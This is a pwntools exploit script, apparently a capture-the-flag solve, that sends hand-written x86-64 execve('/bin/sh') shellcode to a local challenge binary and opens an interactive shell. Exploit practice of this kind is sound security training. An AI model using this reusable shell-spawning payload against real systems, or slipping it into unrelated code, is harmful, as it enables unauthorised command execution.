#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall")
context.binary = exe
context.terminal = ["tmux", "splitw", "-h"] 

sc = (
    b"\x31\xc0"
    b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    b"\x53\x48\x89\xe7"
    b"\x50\x57\x48\x89\xe6"
    b"\x50\x48\x89\xe2"
    b"\xb0\x3b\x0f\x05"
)

assert len(sc) == 29

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript="b *main+61")  
    else:
        r = remote("127.0.0.1", 1337)
    return r

def main():
    io = conn()
    print("LEN SC : ", len(sc))
    io.sendafter(b"Enter your shellcode:\n", sc)  
    io.interactive()

if __name__ == "__main__":
    main()
